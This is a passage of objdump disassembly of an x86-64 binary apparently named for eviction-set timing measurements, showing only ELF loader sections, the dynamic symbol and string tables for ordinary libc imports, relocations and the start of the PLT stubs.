
./build/attacker_evset-timings:     file format elf64-x86-64


Disassembly of section .interp:

0000000000000318 <.interp>:
 318:	2f                   	(bad)
 319:	6c                   	insb   (%dx),%es:(%rdi)
 31a:	69 62 36 34 2f 6c 64 	imul   $0x646c2f34,0x36(%rdx),%esp
 321:	2d 6c 69 6e 75       	sub    $0x756e696c,%eax
 326:	78 2d                	js     355 <__abi_tag-0x27>
 328:	78 38                	js     362 <__abi_tag-0x1a>
 32a:	36 2d 36 34 2e 73    	ss sub $0x732e3436,%eax
 330:	6f                   	outsl  %ds:(%rsi),(%dx)
 331:	2e 32 00             	cs xor (%rax),%al

Disassembly of section .note.gnu.property:

0000000000000338 <.note.gnu.property>:
 338:	04 00                	add    $0x0,%al
 33a:	00 00                	add    %al,(%rax)
 33c:	10 00                	adc    %al,(%rax)
 33e:	00 00                	add    %al,(%rax)
 340:	05 00 00 00 47       	add    $0x47000000,%eax
 345:	4e 55                	rex.WRX push %rbp
 347:	00 02                	add    %al,(%rdx)
 349:	80 00 c0             	addb   $0xc0,(%rax)
 34c:	04 00                	add    $0x0,%al
 34e:	00 00                	add    %al,(%rax)
 350:	01 00                	add    %eax,(%rax)
 352:	00 00                	add    %al,(%rax)
 354:	00 00                	add    %al,(%rax)
	...

Disassembly of section .note.gnu.build-id:

0000000000000358 <.note.gnu.build-id>:
 358:	04 00                	add    $0x0,%al
 35a:	00 00                	add    %al,(%rax)
 35c:	14 00                	adc    $0x0,%al
 35e:	00 00                	add    %al,(%rax)
 360:	03 00                	add    (%rax),%eax
 362:	00 00                	add    %al,(%rax)
 364:	47                   	rex.RXB
 365:	4e 55                	rex.WRX push %rbp
 367:	00 0a                	add    %cl,(%rdx)
 369:	6d                   	insl   (%dx),%es:(%rdi)
 36a:	5d                   	pop    %rbp
 36b:	72 5e                	jb     3cb <__abi_tag+0x4f>
 36d:	0d 99 97 89 0b       	or     $0xb899799,%eax
 372:	b6 16                	mov    $0x16,%dh
 374:	18 de                	sbb    %bl,%dh
 376:	67                   	addr32
 377:	28                   	.byte 0x28
 378:	be                   	.byte 0xbe
 379:	4b 56                	rex.WXB push %r14
 37b:	f2                   	repnz

Disassembly of section .note.ABI-tag:

000000000000037c <__abi_tag>:
 37c:	04 00                	add    $0x0,%al
 37e:	00 00                	add    %al,(%rax)
 380:	10 00                	adc    %al,(%rax)
 382:	00 00                	add    %al,(%rax)
 384:	01 00                	add    %eax,(%rax)
 386:	00 00                	add    %al,(%rax)
 388:	47                   	rex.RXB
 389:	4e 55                	rex.WRX push %rbp
 38b:	00 00                	add    %al,(%rax)
 38d:	00 00                	add    %al,(%rax)
 38f:	00 03                	add    %al,(%rbx)
 391:	00 00                	add    %al,(%rax)
 393:	00 02                	add    %al,(%rdx)
 395:	00 00                	add    %al,(%rax)
 397:	00 00                	add    %al,(%rax)
 399:	00 00                	add    %al,(%rax)
	...

Disassembly of section .gnu.hash:

00000000000003a0 <.gnu.hash>:
 3a0:	02 00                	add    (%rax),%al
 3a2:	00 00                	add    %al,(%rax)
 3a4:	1a 00                	sbb    (%rax),%al
 3a6:	00 00                	add    %al,(%rax)
 3a8:	01 00                	add    %eax,(%rax)
 3aa:	00 00                	add    %al,(%rax)
 3ac:	06                   	(bad)
 3ad:	00 00                	add    %al,(%rax)
 3af:	00 00                	add    %al,(%rax)
 3b1:	00 81 00 00 00 00    	add    %al,0x0(%rcx)
 3b7:	00 1a                	add    %bl,(%rdx)
 3b9:	00 00                	add    %al,(%rax)
 3bb:	00 00                	add    %al,(%rax)
 3bd:	00 00                	add    %al,(%rax)
 3bf:	00 d1                	add    %dl,%cl
 3c1:	65 ce                	gs (bad)
 3c3:	6d                   	insl   (%dx),%es:(%rdi)

Disassembly of section .dynsym:

00000000000003c8 <.dynsym>:
	...
 3e0:	0d 00 00 00 12       	or     $0x12000000,%eax
	...
 3f5:	00 00                	add    %al,(%rax)
 3f7:	00 4e 00             	add    %cl,0x0(%rsi)
 3fa:	00 00                	add    %al,(%rax)
 3fc:	12 00                	adc    (%rax),%al
	...
 40e:	00 00                	add    %al,(%rax)
 410:	cf                   	iret
 411:	00 00                	add    %al,(%rax)
 413:	00 20                	add    %ah,(%rax)
	...
 425:	00 00                	add    %al,(%rax)
 427:	00 01                	add    %al,(%rcx)
 429:	00 00                	add    %al,(%rax)
 42b:	00 12                	add    %dl,(%rdx)
	...
 43d:	00 00                	add    %al,(%rax)
 43f:	00 8a 00 00 00 12    	add    %cl,0x12000000(%rdx)
	...
 455:	00 00                	add    %al,(%rax)
 457:	00 75 00             	add    %dh,0x0(%rbp)
 45a:	00 00                	add    %al,(%rax)
 45c:	12 00                	adc    (%rax),%al
	...
 46e:	00 00                	add    %al,(%rax)
 470:	30 00                	xor    %al,(%rax)
 472:	00 00                	add    %al,(%rax)
 474:	12 00                	adc    (%rax),%al
	...
 486:	00 00                	add    %al,(%rax)
 488:	98                   	cwtl
 489:	00 00                	add    %al,(%rax)
 48b:	00 12                	add    %dl,(%rdx)
	...
 49d:	00 00                	add    %al,(%rax)
 49f:	00 7c 00 00          	add    %bh,0x0(%rax,%rax,1)
 4a3:	00 12                	add    %dl,(%rdx)
	...
 4b5:	00 00                	add    %al,(%rax)
 4b7:	00 60 00             	add    %ah,0x0(%rax)
 4ba:	00 00                	add    %al,(%rax)
 4bc:	12 00                	adc    (%rax),%al
	...
 4ce:	00 00                	add    %al,(%rax)
 4d0:	eb 00                	jmp    4d2 <__abi_tag+0x156>
 4d2:	00 00                	add    %al,(%rax)
 4d4:	20 00                	and    %al,(%rax)
	...
 4e6:	00 00                	add    %al,(%rax)
 4e8:	1e                   	(bad)
 4e9:	00 00                	add    %al,(%rax)
 4eb:	00 12                	add    %dl,(%rdx)
	...
 4fd:	00 00                	add    %al,(%rax)
 4ff:	00 2b                	add    %ch,(%rbx)
 501:	00 00                	add    %al,(%rax)
 503:	00 12                	add    %dl,(%rdx)
	...
 515:	00 00                	add    %al,(%rax)
 517:	00 83 00 00 00 12    	add    %al,0x12000000(%rbx)
	...
 52d:	00 00                	add    %al,(%rax)
 52f:	00 47 00             	add    %al,0x0(%rdi)
 532:	00 00                	add    %al,(%rax)
 534:	12 00                	adc    (%rax),%al
	...
 546:	00 00                	add    %al,(%rax)
 548:	37                   	(bad)
 549:	00 00                	add    %al,(%rax)
 54b:	00 12                	add    %dl,(%rdx)
	...
 55d:	00 00                	add    %al,(%rax)
 55f:	00 17                	add    %dl,(%rdi)
 561:	00 00                	add    %al,(%rax)
 563:	00 12                	add    %dl,(%rdx)
	...
 575:	00 00                	add    %al,(%rax)
 577:	00 90 00 00 00 12    	add    %dl,0x12000000(%rax)
	...
 58d:	00 00                	add    %al,(%rax)
 58f:	00 25 00 00 00 12    	add    %ah,0x12000000(%rip)        # 12000595 <_end+0x11ffa42d>
	...
 5a5:	00 00                	add    %al,(%rax)
 5a7:	00 06                	add    %al,(%rsi)
 5a9:	00 00                	add    %al,(%rax)
 5ab:	00 12                	add    %dl,(%rdx)
	...
 5bd:	00 00                	add    %al,(%rax)
 5bf:	00 3f                	add    %bh,(%rdi)
 5c1:	00 00                	add    %al,(%rax)
 5c3:	00 12                	add    %dl,(%rdx)
	...
 5d5:	00 00                	add    %al,(%rax)
 5d7:	00 12                	add    %dl,(%rdx)
 5d9:	00 00                	add    %al,(%rax)
 5db:	00 12                	add    %dl,(%rdx)
	...
 5ed:	00 00                	add    %al,(%rax)
 5ef:	00 fa                	add    %bh,%dl
 5f1:	00 00                	add    %al,(%rax)
 5f3:	00 20                	add    %ah,(%rax)
	...
 605:	00 00                	add    %al,(%rax)
 607:	00 9d 00 00 00 12    	add    %bl,0x12000000(%rbp)
	...
 61d:	00 00                	add    %al,(%rax)
 61f:	00 61 00             	add    %ah,0x0(%rcx)
 622:	00 00                	add    %al,(%rax)
 624:	12 00                	adc    (%rax),%al
	...
 636:	00 00                	add    %al,(%rax)
 638:	66 00 00             	data16 add %al,(%rax)
 63b:	00 22                	add    %ah,(%rdx)
	...

Disassembly of section .dynstr:

0000000000000650 <.dynstr>:
 650:	00 70 75             	add    %dh,0x75(%rax)
 653:	74 73                	je     6c8 <__abi_tag+0x34c>
 655:	00 70 65             	add    %dh,0x65(%rax)
 658:	72 72                	jb     6cc <__abi_tag+0x350>
 65a:	6f                   	outsl  %ds:(%rsi),(%dx)
 65b:	72 00                	jb     65d <__abi_tag+0x2e1>
 65d:	66 72 65             	data16 jb 6c5 <__abi_tag+0x349>
 660:	65 00 65 78          	add    %ah,%gs:0x78(%rbp)
 664:	69 74 00 6d 75 6e 6d 	imul   $0x616d6e75,0x6d(%rax,%rax,1),%esi
 66b:	61 
 66c:	70 00                	jo     66e <__abi_tag+0x2f2>
 66e:	73 74                	jae    6e4 <__abi_tag+0x368>
 670:	72 74                	jb     6e6 <__abi_tag+0x36a>
 672:	6f                   	outsl  %ds:(%rsi),(%dx)
 673:	6c                   	insb   (%dx),%es:(%rdi)
 674:	00 66 6f             	add    %ah,0x6f(%rsi)
 677:	70 65                	jo     6de <__abi_tag+0x362>
 679:	6e                   	outsb  %ds:(%rsi),(%dx)
 67a:	00 74 69 6d          	add    %dh,0x6d(%rcx,%rbp,2)
 67e:	65 00 73 74          	add    %dh,%gs:0x74(%rbx)
 682:	72 6c                	jb     6f0 <__abi_tag+0x374>
 684:	65 6e                	outsb  %gs:(%rsi),(%dx)
 686:	00 72 65             	add    %dh,0x65(%rdx)
 689:	61                   	(bad)
 68a:	6c                   	insb   (%dx),%es:(%rdi)
 68b:	6c                   	insb   (%dx),%es:(%rdi)
 68c:	6f                   	outsl  %ds:(%rsi),(%dx)
 68d:	63 00                	movsxd (%rax),%eax
 68f:	67 65 74 6c          	addr32 gs je 6ff <__abi_tag+0x383>
 693:	69 6e 65 00 6d 61 6c 	imul   $0x6c616d00,0x65(%rsi),%ebp
 69a:	6c                   	insb   (%dx),%es:(%rdi)
 69b:	6f                   	outsl  %ds:(%rsi),(%dx)
 69c:	63 00                	movsxd (%rax),%eax
 69e:	5f                   	pop    %rdi
 69f:	5f                   	pop    %rdi
 6a0:	6c                   	insb   (%dx),%es:(%rdi)
 6a1:	69 62 63 5f 73 74 61 	imul   $0x6174735f,0x63(%rdx),%esp
 6a8:	72 74                	jb     71e <__abi_tag+0x3a2>
 6aa:	5f                   	pop    %rdi
 6ab:	6d                   	insl   (%dx),%es:(%rdi)
 6ac:	61                   	(bad)
 6ad:	69 6e 00 73 72 61 6e 	imul   $0x6e617273,0x0(%rsi),%ebp
 6b4:	64 00 5f 5f          	add    %bl,%fs:0x5f(%rdi)
 6b8:	63 78 61             	movsxd 0x61(%rax),%edi
 6bb:	5f                   	pop    %rdi
 6bc:	66 69 6e 61 6c 69    	imul   $0x696c,0x61(%rsi),%bp
 6c2:	7a 65                	jp     729 <__abi_tag+0x3ad>
 6c4:	00 66 63             	add    %ah,0x63(%rsi)
 6c7:	6c                   	insb   (%dx),%es:(%rdi)
 6c8:	6f                   	outsl  %ds:(%rsi),(%dx)
 6c9:	73 65                	jae    730 <__abi_tag+0x3b4>
 6cb:	00 70 72             	add    %dh,0x72(%rax)
 6ce:	69 6e 74 66 00 66 69 	imul   $0x69660066,0x74(%rsi),%ebp
 6d5:	6c                   	insb   (%dx),%es:(%rdi)
 6d6:	65 6e                	outsb  %gs:(%rsi),(%dx)
 6d8:	6f                   	outsl  %ds:(%rsi),(%dx)
 6d9:	00 71 73             	add    %dh,0x73(%rcx)
 6dc:	6f                   	outsl  %ds:(%rsi),(%dx)
 6dd:	72 74                	jb     753 <__abi_tag+0x3d7>
 6df:	00 6d 61             	add    %ch,0x61(%rbp)
 6e2:	64 76 69             	fs jbe 74e <__abi_tag+0x3d2>
 6e5:	73 65                	jae    74c <__abi_tag+0x3d0>
 6e7:	00 6d 6d             	add    %ch,0x6d(%rbp)
 6ea:	61                   	(bad)
 6eb:	70 00                	jo     6ed <__abi_tag+0x371>
 6ed:	66 73 74             	data16 jae 764 <__abi_tag+0x3e8>
 6f0:	61                   	(bad)
 6f1:	74 00                	je     6f3 <__abi_tag+0x377>
 6f3:	6c                   	insb   (%dx),%es:(%rdi)
 6f4:	69 62 63 2e 73 6f 2e 	imul   $0x2e6f732e,0x63(%rdx),%esp
 6fb:	36 00 47 4c          	ss add %al,0x4c(%rdi)
 6ff:	49                   	rex.WB
 700:	42                   	rex.X
 701:	43 5f                	rex.XB pop %r15
 703:	32 2e                	xor    (%rsi),%ch
 705:	33 33                	xor    (%rbx),%esi
 707:	00 47 4c             	add    %al,0x4c(%rdi)
 70a:	49                   	rex.WB
 70b:	42                   	rex.X
 70c:	43 5f                	rex.XB pop %r15
 70e:	32 2e                	xor    (%rsi),%ch
 710:	33 34 00             	xor    (%rax,%rax,1),%esi
 713:	47                   	rex.RXB
 714:	4c                   	rex.WR
 715:	49                   	rex.WB
 716:	42                   	rex.X
 717:	43 5f                	rex.XB pop %r15
 719:	32 2e                	xor    (%rsi),%ch
 71b:	32 2e                	xor    (%rsi),%ch
 71d:	35 00 5f 49 54       	xor    $0x54495f00,%eax
 722:	4d 5f                	rex.WRB pop %r15
 724:	64 65 72 65          	fs gs jb 78d <__abi_tag+0x411>
 728:	67 69 73 74 65 72 54 	imul   $0x4d547265,0x74(%ebx),%esi
 72f:	4d 
 730:	43 6c                	rex.XB insb (%dx),%es:(%rdi)
 732:	6f                   	outsl  %ds:(%rsi),(%dx)
 733:	6e                   	outsb  %ds:(%rsi),(%dx)
 734:	65 54                	gs push %rsp
 736:	61                   	(bad)
 737:	62                   	(bad)
 738:	6c                   	insb   (%dx),%es:(%rdi)
 739:	65 00 5f 5f          	add    %bl,%gs:0x5f(%rdi)
 73d:	67 6d                	insl   (%dx),%es:(%edi)
 73f:	6f                   	outsl  %ds:(%rsi),(%dx)
 740:	6e                   	outsb  %ds:(%rsi),(%dx)
 741:	5f                   	pop    %rdi
 742:	73 74                	jae    7b8 <__abi_tag+0x43c>
 744:	61                   	(bad)
 745:	72 74                	jb     7bb <__abi_tag+0x43f>
 747:	5f                   	pop    %rdi
 748:	5f                   	pop    %rdi
 749:	00 5f 49             	add    %bl,0x49(%rdi)
 74c:	54                   	push   %rsp
 74d:	4d 5f                	rex.WRB pop %r15
 74f:	72 65                	jb     7b6 <__abi_tag+0x43a>
 751:	67 69 73 74 65 72 54 	imul   $0x4d547265,0x74(%ebx),%esi
 758:	4d 
 759:	43 6c                	rex.XB insb (%dx),%es:(%rdi)
 75b:	6f                   	outsl  %ds:(%rsi),(%dx)
 75c:	6e                   	outsb  %ds:(%rsi),(%dx)
 75d:	65 54                	gs push %rsp
 75f:	61                   	(bad)
 760:	62                   	.byte 0x62
 761:	6c                   	insb   (%dx),%es:(%rdi)
 762:	65                   	gs
	...

Disassembly of section .gnu.version:

0000000000000764 <.gnu.version>:
 764:	00 00                	add    %al,(%rax)
 766:	02 00                	add    (%rax),%al
 768:	03 00                	add    (%rax),%eax
 76a:	01 00                	add    %eax,(%rax)
 76c:	02 00                	add    (%rax),%al
 76e:	02 00                	add    (%rax),%al
 770:	02 00                	add    (%rax),%al
 772:	02 00                	add    (%rax),%al
 774:	02 00                	add    (%rax),%al
 776:	02 00                	add    (%rax),%al
 778:	02 00                	add    (%rax),%al
 77a:	01 00                	add    %eax,(%rax)
 77c:	02 00                	add    (%rax),%al
 77e:	02 00                	add    (%rax),%al
 780:	02 00                	add    (%rax),%al
 782:	02 00                	add    (%rax),%al
 784:	02 00                	add    (%rax),%al
 786:	02 00                	add    (%rax),%al
 788:	02 00                	add    (%rax),%al
 78a:	02 00                	add    (%rax),%al
 78c:	02 00                	add    (%rax),%al
 78e:	02 00                	add    (%rax),%al
 790:	02 00                	add    (%rax),%al
 792:	01 00                	add    %eax,(%rax)
 794:	04 00                	add    $0x0,%al
 796:	02 00                	add    (%rax),%al
 798:	02 00                	add    (%rax),%al

Disassembly of section .gnu.version_r:

00000000000007a0 <.gnu.version_r>:
 7a0:	01 00                	add    %eax,(%rax)
 7a2:	03 00                	add    (%rax),%eax
 7a4:	a3 00 00 00 10 00 00 	movabs %eax,0x10000000
 7ab:	00 00 
 7ad:	00 00                	add    %al,(%rax)
 7af:	00 b3 91 96 06 00    	add    %dh,0x69691(%rbx)
 7b5:	00 04 00             	add    %al,(%rax,%rax,1)
 7b8:	ad                   	lods   %ds:(%rsi),%eax
 7b9:	00 00                	add    %al,(%rax)
 7bb:	00 10                	add    %dl,(%rax)
 7bd:	00 00                	add    %al,(%rax)
 7bf:	00 b4 91 96 06 00 00 	add    %dh,0x696(%rcx,%rdx,4)
 7c6:	03 00                	add    (%rax),%eax
 7c8:	b8 00 00 00 10       	mov    $0x10000000,%eax
 7cd:	00 00                	add    %al,(%rax)
 7cf:	00 75 1a             	add    %dh,0x1a(%rbp)
 7d2:	69 09 00 00 02 00    	imul   $0x20000,(%rcx),%ecx
 7d8:	c3                   	ret
 7d9:	00 00                	add    %al,(%rax)
 7db:	00 00                	add    %al,(%rax)
 7dd:	00 00                	add    %al,(%rax)
	...

Disassembly of section .rela.dyn:

00000000000007e0 <.rela.dyn>:
 7e0:	d0 5d 00             	rcrb   0x0(%rbp)
 7e3:	00 00                	add    %al,(%rax)
 7e5:	00 00                	add    %al,(%rax)
 7e7:	00 08                	add    %cl,(%rax)
 7e9:	00 00                	add    %al,(%rax)
 7eb:	00 00                	add    %al,(%rax)
 7ed:	00 00                	add    %al,(%rax)
 7ef:	00 70 12             	add    %dh,0x12(%rax)
 7f2:	00 00                	add    %al,(%rax)
 7f4:	00 00                	add    %al,(%rax)
 7f6:	00 00                	add    %al,(%rax)
 7f8:	d8 5d 00             	fcomps 0x0(%rbp)
 7fb:	00 00                	add    %al,(%rax)
 7fd:	00 00                	add    %al,(%rax)
 7ff:	00 08                	add    %cl,(%rax)
 801:	00 00                	add    %al,(%rax)
 803:	00 00                	add    %al,(%rax)
 805:	00 00                	add    %al,(%rax)
 807:	00 30                	add    %dh,(%rax)
 809:	12 00                	adc    (%rax),%al
 80b:	00 00                	add    %al,(%rax)
 80d:	00 00                	add    %al,(%rax)
 80f:	00 b0 60 00 00 00    	add    %dh,0x60(%rax)
 815:	00 00                	add    %al,(%rax)
 817:	00 08                	add    %cl,(%rax)
 819:	00 00                	add    %al,(%rax)
 81b:	00 00                	add    %al,(%rax)
 81d:	00 00                	add    %al,(%rax)
 81f:	00 b0 60 00 00 00    	add    %dh,0x60(%rax)
 825:	00 00                	add    %al,(%rax)
 827:	00 c0                	add    %al,%al
 829:	5f                   	pop    %rdi
 82a:	00 00                	add    %al,(%rax)
 82c:	00 00                	add    %al,(%rax)
 82e:	00 00                	add    %al,(%rax)
 830:	06                   	(bad)
 831:	00 00                	add    %al,(%rax)
 833:	00 02                	add    %al,(%rdx)
	...
 83d:	00 00                	add    %al,(%rax)
 83f:	00 c8                	add    %cl,%al
 841:	5f                   	pop    %rdi
 842:	00 00                	add    %al,(%rax)
 844:	00 00                	add    %al,(%rax)
 846:	00 00                	add    %al,(%rax)
 848:	06                   	(bad)
 849:	00 00                	add    %al,(%rax)
 84b:	00 03                	add    %al,(%rbx)
	...
 855:	00 00                	add    %al,(%rax)
 857:	00 d0                	add    %dl,%al
 859:	5f                   	pop    %rdi
 85a:	00 00                	add    %al,(%rax)
 85c:	00 00                	add    %al,(%rax)
 85e:	00 00                	add    %al,(%rax)
 860:	06                   	(bad)
 861:	00 00                	add    %al,(%rax)
 863:	00 0b                	add    %cl,(%rbx)
	...
 86d:	00 00                	add    %al,(%rax)
 86f:	00 d8                	add    %bl,%al
 871:	5f                   	pop    %rdi
 872:	00 00                	add    %al,(%rax)
 874:	00 00                	add    %al,(%rax)
 876:	00 00                	add    %al,(%rax)
 878:	06                   	(bad)
 879:	00 00                	add    %al,(%rax)
 87b:	00 17                	add    %dl,(%rdi)
	...
 885:	00 00                	add    %al,(%rax)
 887:	00 e0                	add    %ah,%al
 889:	5f                   	pop    %rdi
 88a:	00 00                	add    %al,(%rax)
 88c:	00 00                	add    %al,(%rax)
 88e:	00 00                	add    %al,(%rax)
 890:	06                   	(bad)
 891:	00 00                	add    %al,(%rax)
 893:	00 1a                	add    %bl,(%rdx)
	...

Disassembly of section .rela.plt:

00000000000008a0 <.rela.plt>:
 8a0:	00 60 00             	add    %ah,0x0(%rax)
 8a3:	00 00                	add    %al,(%rax)
 8a5:	00 00                	add    %al,(%rax)
 8a7:	00 07                	add    %al,(%rdi)
 8a9:	00 00                	add    %al,(%rax)
 8ab:	00 01                	add    %al,(%rcx)
	...
 8b5:	00 00                	add    %al,(%rax)
 8b7:	00 08                	add    %cl,(%rax)
 8b9:	60                   	(bad)
 8ba:	00 00                	add    %al,(%rax)
 8bc:	00 00                	add    %al,(%rax)
 8be:	00 00                	add    %al,(%rax)
 8c0:	07                   	(bad)
 8c1:	00 00                	add    %al,(%rax)
 8c3:	00 04 00             	add    %al,(%rax,%rax,1)
	...
 8ce:	00 00                	add    %al,(%rax)
 8d0:	10 60 00             	adc    %ah,0x0(%rax)
 8d3:	00 00                	add    %al,(%rax)
 8d5:	00 00                	add    %al,(%rax)
 8d7:	00 07                	add    %al,(%rdi)
 8d9:	00 00                	add    %al,(%rax)
 8db:	00 05 00 00 00 00    	add    %al,0x0(%rip)        # 8e1 <__abi_tag+0x565>
 8e1:	00 00                	add    %al,(%rax)
 8e3:	00 00                	add    %al,(%rax)
 8e5:	00 00                	add    %al,(%rax)
 8e7:	00 18                	add    %bl,(%rax)
 8e9:	60                   	(bad)
 8ea:	00 00                	add    %al,(%rax)
 8ec:	00 00                	add    %al,(%rax)
 8ee:	00 00                	add    %al,(%rax)
 8f0:	07                   	(bad)
 8f1:	00 00                	add    %al,(%rax)
 8f3:	00 06                	add    %al,(%rsi)
	...
 8fd:	00 00                	add    %al,(%rax)
 8ff:	00 20                	add    %ah,(%rax)
 901:	60                   	(bad)
 902:	00 00                	add    %al,(%rax)
 904:	00 00                	add    %al,(%rax)
 906:	00 00                	add    %al,(%rax)
 908:	07                   	(bad)
 909:	00 00                	add    %al,(%rax)
 90b:	00 07                	add    %al,(%rdi)
	...
 915:	00 00                	add    %al,(%rax)
 917:	00 28                	add    %ch,(%rax)
 919:	60                   	(bad)
 91a:	00 00                	add    %al,(%rax)
 91c:	00 00                	add    %al,(%rax)
 91e:	00 00                	add    %al,(%rax)
 920:	07                   	(bad)
 921:	00 00                	add    %al,(%rax)
 923:	00 08                	add    %cl,(%rax)
	...
 92d:	00 00                	add    %al,(%rax)
 92f:	00 30                	add    %dh,(%rax)
 931:	60                   	(bad)
 932:	00 00                	add    %al,(%rax)
 934:	00 00                	add    %al,(%rax)
 936:	00 00                	add    %al,(%rax)
 938:	07                   	(bad)
 939:	00 00                	add    %al,(%rax)
 93b:	00 09                	add    %cl,(%rcx)
	...
 945:	00 00                	add    %al,(%rax)
 947:	00 38                	add    %bh,(%rax)
 949:	60                   	(bad)
 94a:	00 00                	add    %al,(%rax)
 94c:	00 00                	add    %al,(%rax)
 94e:	00 00                	add    %al,(%rax)
 950:	07                   	(bad)
 951:	00 00                	add    %al,(%rax)
 953:	00 0a                	add    %cl,(%rdx)
	...
 95d:	00 00                	add    %al,(%rax)
 95f:	00 40 60             	add    %al,0x60(%rax)
 962:	00 00                	add    %al,(%rax)
 964:	00 00                	add    %al,(%rax)
 966:	00 00                	add    %al,(%rax)
 968:	07                   	(bad)
 969:	00 00                	add    %al,(%rax)
 96b:	00 0c 00             	add    %cl,(%rax,%rax,1)
	...
 976:	00 00                	add    %al,(%rax)
 978:	48 60                	rex.W (bad)
 97a:	00 00                	add    %al,(%rax)
 97c:	00 00                	add    %al,(%rax)
 97e:	00 00                	add    %al,(%rax)
 980:	07                   	(bad)
 981:	00 00                	add    %al,(%rax)
 983:	00 0d 00 00 00 00    	add    %cl,0x0(%rip)        # 989 <__abi_tag+0x60d>
 989:	00 00                	add    %al,(%rax)
 98b:	00 00                	add    %al,(%rax)
 98d:	00 00                	add    %al,(%rax)
 98f:	00 50 60             	add    %dl,0x60(%rax)
 992:	00 00                	add    %al,(%rax)
 994:	00 00                	add    %al,(%rax)
 996:	00 00                	add    %al,(%rax)
 998:	07                   	(bad)
 999:	00 00                	add    %al,(%rax)
 99b:	00 0e                	add    %cl,(%rsi)
	...
 9a5:	00 00                	add    %al,(%rax)
 9a7:	00 58 60             	add    %bl,0x60(%rax)
 9aa:	00 00                	add    %al,(%rax)
 9ac:	00 00                	add    %al,(%rax)
 9ae:	00 00                	add    %al,(%rax)
 9b0:	07                   	(bad)
 9b1:	00 00                	add    %al,(%rax)
 9b3:	00 0f                	add    %cl,(%rdi)
	...
 9bd:	00 00                	add    %al,(%rax)
 9bf:	00 60 60             	add    %ah,0x60(%rax)
 9c2:	00 00                	add    %al,(%rax)
 9c4:	00 00                	add    %al,(%rax)
 9c6:	00 00                	add    %al,(%rax)
 9c8:	07                   	(bad)
 9c9:	00 00                	add    %al,(%rax)
 9cb:	00 10                	add    %dl,(%rax)
	...
 9d5:	00 00                	add    %al,(%rax)
 9d7:	00 68 60             	add    %ch,0x60(%rax)
 9da:	00 00                	add    %al,(%rax)
 9dc:	00 00                	add    %al,(%rax)
 9de:	00 00                	add    %al,(%rax)
 9e0:	07                   	(bad)
 9e1:	00 00                	add    %al,(%rax)
 9e3:	00 11                	add    %dl,(%rcx)
	...
 9ed:	00 00                	add    %al,(%rax)
 9ef:	00 70 60             	add    %dh,0x60(%rax)
 9f2:	00 00                	add    %al,(%rax)
 9f4:	00 00                	add    %al,(%rax)
 9f6:	00 00                	add    %al,(%rax)
 9f8:	07                   	(bad)
 9f9:	00 00                	add    %al,(%rax)
 9fb:	00 12                	add    %dl,(%rdx)
	...
 a05:	00 00                	add    %al,(%rax)
 a07:	00 78 60             	add    %bh,0x60(%rax)
 a0a:	00 00                	add    %al,(%rax)
 a0c:	00 00                	add    %al,(%rax)
 a0e:	00 00                	add    %al,(%rax)
 a10:	07                   	(bad)
 a11:	00 00                	add    %al,(%rax)
 a13:	00 13                	add    %dl,(%rbx)
	...
 a1d:	00 00                	add    %al,(%rax)
 a1f:	00 80 60 00 00 00    	add    %al,0x60(%rax)
 a25:	00 00                	add    %al,(%rax)
 a27:	00 07                	add    %al,(%rdi)
 a29:	00 00                	add    %al,(%rax)
 a2b:	00 14 00             	add    %dl,(%rax,%rax,1)
	...
 a36:	00 00                	add    %al,(%rax)
 a38:	88 60 00             	mov    %ah,0x0(%rax)
 a3b:	00 00                	add    %al,(%rax)
 a3d:	00 00                	add    %al,(%rax)
 a3f:	00 07                	add    %al,(%rdi)
 a41:	00 00                	add    %al,(%rax)
 a43:	00 15 00 00 00 00    	add    %dl,0x0(%rip)        # a49 <__abi_tag+0x6cd>
 a49:	00 00                	add    %al,(%rax)
 a4b:	00 00                	add    %al,(%rax)
 a4d:	00 00                	add    %al,(%rax)
 a4f:	00 90 60 00 00 00    	add    %dl,0x60(%rax)
 a55:	00 00                	add    %al,(%rax)
 a57:	00 07                	add    %al,(%rdi)
 a59:	00 00                	add    %al,(%rax)
 a5b:	00 16                	add    %dl,(%rsi)
	...
 a65:	00 00                	add    %al,(%rax)
 a67:	00 98 60 00 00 00    	add    %bl,0x60(%rax)
 a6d:	00 00                	add    %al,(%rax)
 a6f:	00 07                	add    %al,(%rdi)
 a71:	00 00                	add    %al,(%rax)
 a73:	00 18                	add    %bl,(%rax)
	...
 a7d:	00 00                	add    %al,(%rax)
 a7f:	00 a0 60 00 00 00    	add    %ah,0x60(%rax)
 a85:	00 00                	add    %al,(%rax)
 a87:	00 07                	add    %al,(%rdi)
 a89:	00 00                	add    %al,(%rax)
 a8b:	00 19                	add    %bl,(%rcx)
	...

Disassembly of section .init:

0000000000001000 <_init>:
    1000:	48 83 ec 08          	sub    $0x8,%rsp
    1004:	48 8b 05 c5 4f 00 00 	mov    0x4fc5(%rip),%rax        # 5fd0 <__gmon_start__@Base>
    100b:	48 85 c0             	test   %rax,%rax
    100e:	74 02                	je     1012 <_init+0x12>
    1010:	ff d0                	call   *%rax
    1012:	48 83 c4 08          	add    $0x8,%rsp
    1016:	c3                   	ret

Disassembly of section .plt:

0000000000001020 <free@plt-0x10>:
    1020:	ff 35 ca 4f 00 00    	push   0x4fca(%rip)        # 5ff0 <_GLOBAL_OFFSET_TABLE_+0x8>
    1026:	ff 25 cc 4f 00 00    	jmp    *0x4fcc(%rip)        # 5ff8 <_GLOBAL_OFFSET_TABLE_+0x10>
    102c:	0f 1f 40 00          	nopl   0x0(%rax)

0000000000001030 <free@plt>:
    1030:	ff 25 ca 4f 00 00    	jmp    *0x4fca(%rip)        # 6000 <free@GLIBC_2.2.5>
    1036:	68 00 00 00 00       	push   $0x0
    103b:	e9 e0 ff ff ff       	jmp    1020 <_init+0x20>

0000000000001040 <puts@plt>:
    1040:	ff 25 c2 4f 00 00    	jmp    *0x4fc2(%rip)        # 6008 <puts@GLIBC_2.2.5>
    1046:	68 01 00 00 00       	push   $0x1
    104b:	e9 d0 ff ff ff       	jmp    1020 <_init+0x20>

0000000000001050 <qsort@plt>:
    1050:	ff 25 ba 4f 00 00    	jmp    *0x4fba(%rip)        # 6010 <qsort@GLIBC_2.2.5>
    1056:	68 02 00 00 00       	push   $0x2
    105b:	e9 c0 ff ff ff       	jmp    1020 <_init+0x20>

0000000000001060 <fclose@plt>:
    1060:	ff 25 b2 4f 00 00    	jmp    *0x4fb2(%rip)        # 6018 <fclose@GLIBC_2.2.5>
    1066:	68 03 00 00 00       	push   $0x3
    106b:	e9 b0 ff ff ff       	jmp    1020 <_init+0x20>

0000000000001070 <strlen@plt>:
    1070:	ff 25 aa 4f 00 00    	jmp    *0x4faa(%rip)        # 6020 <strlen@GLIBC_2.2.5>
    1076:	68 04 00 00 00       	push   $0x4
